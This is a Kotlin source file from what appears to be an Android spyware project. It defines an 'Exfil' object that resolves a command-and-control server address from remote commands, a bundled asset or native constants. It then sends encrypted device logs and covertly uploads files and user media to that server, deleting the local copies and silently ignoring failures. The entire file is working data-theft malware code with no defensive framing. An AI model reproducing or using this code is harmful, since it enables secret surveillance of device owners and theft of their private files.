package com.sp.core.c2

import android.content.Context
import android.net.Uri
import com.sp.core.util.Crypto
import com.sp.core.util.Prefs
import com.sp.loader.NativeKey
import okhttp3.*
import java.io.File
import java.util.concurrent.TimeUnit

object Exfil {
    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    @Volatile private var c2Url: String? = null
    @Volatile private var apiKey: String? = null

    /**
     * Resolution order:
     *   1. Runtime config set via setC2() (FCM "cfg" command) — highest priority
     *   2. assets/c2.conf  — "<url>|<apikey>" (allows changing URL without rebuilding)
     *   3. Prefs            — previously persisted config
     *   4. Native constants  — compiled-in fallback
     */
    private fun resolveConfig(ctx: Context) {
        if (c2Url != null) return

        val runtime = Prefs.get(ctx, "c2_url", null) as? String
        val runtimeKey = Prefs.get(ctx, "api_key", null) as? String

        if (!runtime.isNullOrEmpty()) {
            c2Url = runtime
            apiKey = runtimeKey
            return
        }

        try {
            ctx.assets.open("c2.conf").use { input ->
                val line = input.bufferedReader().readLine().orEmpty()
                if (line.isNotBlank()) {
                    val parts = line.split("|", limit = 2)
                    c2Url = parts[0].trim()
                    apiKey = parts.getOrNull(1)?.trim()
                    persist(ctx, c2Url!!, apiKey)
                    return
                }
            }
        } catch (_: Exception) {}

        val stored = Prefs.get(ctx, "c2_url", null) as? String
        c2Url = stored?.takeIf { it.isNotEmpty() } ?: NativeKey.c2Url()
        apiKey = (Prefs.get(ctx, "api_key", null) as? String)
            ?.takeIf { it.isNotEmpty() } ?: NativeKey.apiKey()
    }

    private fun persist(ctx: Context, url: String, key: String?) {
        Prefs.set(ctx, "c2_url", url)
        if (!key.isNullOrEmpty()) Prefs.set(ctx, "api_key", key)
    }

    /** Remote reconfiguration — used by the FCM "cfg" command. */
    fun setC2(ctx: Context, url: String, key: String? = null) {
        c2Url = url.trimEnd('/')
        apiKey = key
        persist(ctx, c2Url!!, apiKey)
    }

    fun currentUrl(): String? {
        c2Url?.let { return it }
        return null
    }

    private fun endpoint(path: String): String? {
        val base = c2Url?.trimEnd('/') ?: return null
        return "$base$path"
    }

    fun sendLog(ctx: Context, kind: String, payload: String) {
        resolveConfig(ctx)
        val url = endpoint("/ingest") ?: return
        val deviceId = Prefs.deviceId(ctx)
        val encrypted = Crypto.encrypt("$deviceId|$kind|$payload")
        val body = FormBody.Builder()
            .add("d", encrypted).add("k", apiKey ?: "").build()
        val req = Request.Builder().url(url).post(body).build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, response: Response) { response.close() }
        })
    }

    fun uploadFile(ctx: Context, file: File, kind: String) {
        resolveConfig(ctx)
        val url = endpoint("/upload") ?: return

        val deviceId = Prefs.deviceId(ctx)
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("meta", "$deviceId|$kind|${file.name}")
            .addFormDataPart("f", file.name,
                RequestBody.create(file, MediaType.parse("application/octet-stream")))
            .build()
        val req = Request.Builder().url(url)
            .header("X-Key", apiKey ?: "").post(body).build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, response: Response) {
                response.close(); file.delete()
            }
        })
    }

    fun uploadMedia(ctx: Context, uri: Uri, kind: String, name: String, size: Long) {
        try {
            val tmp = File(ctx.cacheDir, "m_${System.currentTimeMillis()}_$name")
            ctx.contentResolver.openInputStream(uri)?.use { ins ->
                tmp.outputStream().use { outs -> ins.copyTo(outs) }
            }
            uploadFile(ctx, tmp, kind)
        } catch (_: Exception) {}
    }
}
